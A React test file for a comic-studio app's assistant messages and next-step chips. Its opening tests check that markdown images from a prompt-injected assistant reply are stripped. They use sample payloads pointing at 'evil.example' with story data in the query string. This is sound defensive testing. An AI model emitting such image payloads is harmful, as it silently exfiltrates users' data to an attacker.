import React from 'react';
import { describe, expect, it, vi } from 'vitest';
import { fireEvent, render, screen, waitFor } from '@testing-library/react';

import type { ClientAction, Msg, NextStep } from '../../../shared/comic/doc';
import { AssistantMessage } from './MessageItem';
import { chipUsd, chipsFor, fallbackNextSteps, priceBadge, stepToRun } from './cards/NextStepChips';
import { makeFakeStudio, makeSampleDoc } from './testing/fixtures';

const msg = (text: string, extra: Partial<Msg> = {}): Msg => ({ id: 'a1', role: 'assistant', text, at: 1, ...extra });

describe('AssistantMessage — director markdown images are stripped', () => {
  // A prompt-injected director reply must not become a zero-click `<img>` that leaks
  // the story data to an attacker's URL the moment it streams in.
  it('renders no image element for an injected inline image, keeping its alt text', () => {
    const studio = makeFakeStudio();
    render(
      <AssistantMessage
        msg={msg('Here is the plan ![leak](https://evil.example/p.png?d=secret) — ready?')}
        studio={studio}
      />
    );
    expect(screen.queryByRole('img')).not.toBeInTheDocument();
    expect(document.querySelector('img')).toBeNull();
    expect(screen.getByText(/Here is the plan leak — ready\?/)).toBeInTheDocument();
  });

  it('strips image markup from streaming draft text too', () => {
    const studio = makeFakeStudio();
    render(
      <AssistantMessage
        msg={msg('')}
        draft="Drafting ![](https://evil.example/x?d=title) more"
        streaming
        studio={studio}
      />
    );
    expect(document.querySelector('img')).toBeNull();
  });

  it('leaves a genuine markdown link clickable (only images are neutralised)', () => {
    const studio = makeFakeStudio();
    render(<AssistantMessage msg={msg('See [the brief](https://example.com/brief).')} studio={studio} />);
    expect(screen.getByRole('link', { name: 'the brief' })).toHaveAttribute('href', 'https://example.com/brief');
  });
});

// ── Next-step chips (softwarefirst.md #20; director.md §3.12) ───────────────

/** A fake controller whose runNextStep dispatches exactly like useStudio's (contract §13.1). */
const dispatchingStudio = (extra: Parameters<typeof makeFakeStudio>[0] = {}) => {
  const studio = makeFakeStudio(extra);
  const runClientAction = vi.fn((a: ClientAction) => {
    if (a.type === 'open_tab') studio.setTab(a.tab);
    if (a.type === 'open_reader') studio.setTab('read');
  });
  const runNextStep = vi.fn(async (step: NextStep) => {
    if (step.action) return studio.act(step.action);
    if (step.client) return runClientAction(step.client);
    return studio.send((step.say || step.label).trim());
  });
  return Object.assign(studio, { runClientAction, runNextStep });
};

describe('AssistantMessage — next-step chips', () => {
  const steps: NextStep[] = [
    { label: 'Make the cover', action: { type: 'render_cover', quotedUsd: 0.07 }, usd: 0.07 },
    { label: 'Read it', client: { type: 'open_tab', tab: 'read' }, usd: 0 },
    { label: 'Make it funnier', say: 'Make the dialogue funnier' }
  ];

  it('an action chip runs the action (no director call), priced; a client chip navigates, "Free"', async () => {
    const studio = dispatchingStudio();
    render(<AssistantMessage msg={msg('Page 1 is ready.', { nextSteps: steps })} showSuggestions studio={studio} />);
    const group = screen.getByRole('group', { name: 'Next steps' });
    expect(group).toHaveTextContent('≈$0.07');
    expect(group).toHaveTextContent('Free');
    fireEvent.click(screen.getByRole('button', { name: 'Make the cover, about $0.07' }));
    await waitFor(() => expect(studio.act).toHaveBeenCalledWith({ type: 'render_cover', quotedUsd: 0.07 }));
    expect(studio.runNextStep).toHaveBeenCalledWith(steps[0]);
    expect(studio.send).not.toHaveBeenCalled();
    fireEvent.click(screen.getByRole('button', { name: 'Read it, free' }));
    await waitFor(() => expect(studio.setTab).toHaveBeenCalledWith('read'));
  });

  it('a say chip sends its text to the director', async () => {
    const studio = dispatchingStudio();
    render(<AssistantMessage msg={msg('Done.', { nextSteps: steps })} showSuggestions studio={studio} />);
    fireEvent.click(screen.getByRole('button', { name: 'Make it funnier' }));
    await waitFor(() => expect(studio.send).toHaveBeenCalledWith('Make the dialogue funnier'));
  });

  it('legacy string suggestions still send; v4 object chips upgrade (tab → client, action → act)', async () => {
    const studio = dispatchingStudio();
    const legacy = ['Add a twist', { label: 'Open the cast', tab: 'cast' }, { label: 'Show the pages', action: { type: 'show_breakdown' } }] as unknown as string[];
    render(<AssistantMessage msg={msg('Here you go.', { suggestions: legacy })} showSuggestions studio={studio} />);
    fireEvent.click(screen.getByRole('button', { name: 'Add a twist' }));
    await waitFor(() => expect(studio.send).toHaveBeenCalledWith('Add a twist'));
    expect(studio.runNextStep).not.toHaveBeenCalled();
    fireEvent.click(screen.getByRole('button', { name: /Open the cast/ }));
    await waitFor(() => expect(studio.setTab).toHaveBeenCalledWith('cast'));
    fireEvent.click(screen.getByRole('button', { name: /Show the pages/ }));
    await waitFor(() => expect(studio.act).toHaveBeenCalledWith({ type: 'show_breakdown' }));
  });

  it('text chips wait while a director turn streams; action and client chips stay usable', () => {
    const studio = dispatchingStudio({ messageBusy: true });
    render(<AssistantMessage msg={msg('Ok.', { nextSteps: steps })} showSuggestions studio={studio} />);
    expect(screen.getByRole('button', { name: 'Make it funnier' })).toBeDisabled();
    expect(screen.getByRole('button', { name: 'Read it, free' })).toBeEnabled();
  });

  it('chips only show on the latest reply', () => {
    render(<AssistantMessage msg={msg('Old reply', { nextSteps: steps })} studio={makeFakeStudio()} />);
    expect(screen.queryByRole('group', { name: 'Next steps' })).toBeNull();
  });

  it('a reply with no chips still offers a free next move', () => {
    const doc = makeSampleDoc(); // pages 2 and 3 not drawn
    render(<AssistantMessage msg={msg('Planned.')} showSuggestions studio={makeFakeStudio({ doc })} />);
    expect(screen.getByRole('button', { name: 'See the pages, free' })).toBeInTheDocument();
  });

  it('never silent: an empty committed reply still says something', () => {
    render(<AssistantMessage msg={msg('')} studio={makeFakeStudio()} />);
    expect(screen.getByText(/Done — the board shows the latest/)).toBeInTheDocument();
  });

  it('helpers: price badge, chip precedence and fallbacks', () => {
    expect(priceBadge(0)).toBe('Free');
    expect(priceBadge(0.0655)).toBe('≈$0.07');
    expect(priceBadge(undefined)).toBeUndefined();
    // a spend chip without its own usd is priced from the quote its action carries
    expect(chipUsd({ label: 'Draw 2 pages', action: { type: 'render_pages', quotedUsd: 0.14 } })).toBe(0.14);
    // a paid action is never badged cheaper than the quote it is billed against (no "Free" on a spend)
    expect(chipUsd({ label: 'Free fix', action: { type: 'render_pages', quotedUsd: 0.14 }, usd: 0 })).toBe(0.14);
    // free actions keep their own price
    expect(chipUsd({ label: 'Fit (Free)', action: { type: 'fit_render', target: { kind: 'cover' } }, usd: 0 })).toBe(0);
    expect(chipUsd({ label: 'Talk', say: 'hi' })).toBeUndefined();
    const doc = makeSampleDoc();
    // nextSteps beat suggestions; invalid steps (two kinds at once) are dropped
    const bad = { label: 'Both', say: 'x', client: { type: 'undo' } } as NextStep;
    expect(chipsFor(msg('x', { nextSteps: [bad, steps[1]], suggestions: ['old'] }), doc).map((c) => c.step.label)).toEqual(['Read it']);
    expect(chipsFor(msg('x', { suggestions: ['old'] }), doc)).toEqual([{ step: { label: 'old' }, legacy: true }]);
    expect(chipsFor(msg('x'), doc)).toEqual([]);
    // all drawn → Read it; nothing planned → plan (when there is a story); open gate → nothing
    const drawn = makeSampleDoc();
    drawn.pages = drawn.pages.map((p) => ({ ...p, render: { status: 'ready', history: [], asset: { path: `u/${p.id}.webp`, source: 'generated', at: 1 } } }));
    expect(fallbackNextSteps(drawn)).toEqual([{ label: 'Read it', client: { type: 'open_reader' }, usd: 0 }]);
    expect(fallbackNextSteps(makeSampleDoc({ pages: [] }))).toEqual([{ label: 'Plan the pages', say: 'Plan the pages' }]);
    expect(fallbackNextSteps(makeSampleDoc({ gate: { id: 'g', action: { type: 'render_cover' }, title: '', summary: '', estimateUsd: 0, imageCount: 1, model: '', createdAt: 1, status: 'open', reason: 'policy' } }))).toEqual([]);
  });

  it('a spend chip always runs with the price the user saw; an unpriced one is re-gated, never billed blind', async () => {
    // priced by usd only → that price becomes the quote
    expect(stepToRun({ label: 'Draw', action: { type: 'render_pages' }, usd: 0.14 }).action).toEqual({ type: 'render_pages', quotedUsd: 0.14 });
    // no price at all → quotedUsd 0, so the server comes back with a priced approval instead of spending
    expect(stepToRun({ label: 'Draw', action: { type: 'render_cover' } }).action).toEqual({ type: 'render_cover', quotedUsd: 0 });
    // already quoted, or not a spend → unchanged (same object)
    const quoted: NextStep = { label: 'Cover', action: { type: 'render_cover', quotedUsd: 0.07 }, usd: 0.07 };
    expect(stepToRun(quoted)).toBe(quoted);
    const free: NextStep = { label: 'Pages', action: { type: 'show_breakdown' } };
    expect(stepToRun(free)).toBe(free);

    const studio = dispatchingStudio();
    render(<AssistantMessage msg={msg('Ok.', { nextSteps: [{ label: 'Draw the cover', action: { type: 'render_cover' } }] })} showSuggestions studio={studio} />);
    expect(screen.getByRole('group', { name: 'Next steps' })).not.toHaveTextContent('Free');
    fireEvent.click(screen.getByRole('button', { name: 'Draw the cover' }));
    await waitFor(() => expect(studio.act).toHaveBeenCalledWith({ type: 'render_cover', quotedUsd: 0 }));
  });

  it('a running action chip never freezes the others (a render streams for minutes)', async () => {
    let finish: () => void = () => undefined;
    const studio = dispatchingStudio();
    studio.act.mockImplementation(() => new Promise<void>((r) => (finish = r)));
    render(<AssistantMessage msg={msg('Page 1 is ready.', { nextSteps: steps })} showSuggestions studio={studio} />);
    fireEvent.click(screen.getByRole('button', { name: 'Make the cover, about $0.07' }));
    await waitFor(() => expect(screen.getByRole('button', { name: 'Make the cover, about $0.07' })).toBeDisabled());
    // a second tap on the same chip is ignored while it runs
    fireEvent.click(screen.getByRole('button', { name: 'Make the cover, about $0.07' }));
    expect(studio.act).toHaveBeenCalledTimes(1);
    expect(screen.getByRole('button', { name: 'Read it, free' })).toBeEnabled();
    expect(screen.getByRole('button', { name: 'Make it funnier' })).toBeEnabled();
    finish();
    await waitFor(() => expect(screen.getByRole('button', { name: 'Make the cover, about $0.07' })).toBeEnabled());
  });
});
